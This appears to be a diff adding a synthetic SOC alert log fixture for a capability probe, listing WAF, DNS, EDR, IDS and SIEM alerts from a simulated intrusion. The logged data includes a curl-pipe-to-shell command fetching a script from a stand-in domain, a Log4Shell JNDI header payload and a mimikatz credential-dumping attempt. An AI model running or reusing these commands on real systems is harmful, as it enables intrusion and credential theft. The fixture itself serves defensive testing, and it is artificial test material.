@@ -1,0 +1,47 @@
+# =============================================================================
+# Simulated SOC Alert Log — Probe 2 fixture (Step 2.3)
+# SYNTHETIC DATA for baseline capability probing. Not real telemetry.
+# =============================================================================
+
+2026-11-26T02:14:07Z  WAF       HIGH      Inbound request blocked, rule 942100 (SQLi)
+    src_ip=185.220.101.42  dst=203.0.113.80:443  uri=/api/v1/login
+    user_agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)
+    geo=DE  asn=AS208294  tor_exit=yes
+
+2026-11-26T02:14:39Z  WAF       HIGH      Repeated inbound requests, rule 913100 (scanner)
+    src_ip=185.220.101.42  dst=203.0.113.80:443  count=412  window=60s
+
+2026-11-26T02:16:12Z  DNS       MEDIUM    Query to newly registered domain
+    src_host=APP-SRV-07  query=update-cdn-sync.example
+    resolved=198.51.100.77  ttl=60  age_days=3  category=uncategorised
+
+2026-11-26T02:17:02Z  EDR       CRITICAL  Suspicious process spawned by web service
+    host=APP-SRV-07  parent=java (pid 4412)  child=/bin/sh -c curl
+    cmdline=curl -s http://update-cdn-sync.example/a.sh | sh
+    file_sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+    signature=unsigned  entropy=7.82
+
+2026-11-26T02:17:44Z  IDS       CRITICAL  Outbound C2 beacon pattern detected
+    src=APP-SRV-07:51244  dst=update-cdn-sync.example:443
+    interval_jitter=30s  bytes_out=18432  pattern=periodic_https_beacon
+
+2026-11-26T02:19:15Z  EDR       CRITICAL  Exploitation attempt matched signature
+    host=APP-SRV-07  vuln_id=CVE-2021-44228
+    detail=Apache Log4j2 JNDI lookup in HTTP header
+    header=X-Api-Version: ${jndi:ldap://update-cdn-sync.example:1389/a}
+
+2026-11-26T02:22:31Z  WAF       CRITICAL  Exploitation attempt matched signature
+    src_ip=185.220.101.42  dst=198.51.100.20:443  vuln_id=CVE-2024-3400
+    detail=PAN-OS GlobalProtect command injection
+    uri=/global-protect/login.esp  param=SESSID
+
+2026-11-26T02:25:08Z  EDR       HIGH      Credential access attempt
+    host=APP-SRV-07  process=mimikatz.exe  target=lsass.exe
+    action=blocked  user_ctx=NT AUTHORITY\IIS APPPOOL\DefaultAppPool
+
+2026-11-26T02:31:50Z  SIEM      MEDIUM    Lateral movement indicator
+    src=APP-SRV-07  dst=DC-01  protocol=SMB  port=445
+    attempts=14  auth_result=failure  account=svc_backup
+
+2026-11-26T02:38:00Z  SIEM      LOW       Log source gap detected
+    source=APP-SRV-07  gap_seconds=420  reason=agent_restart
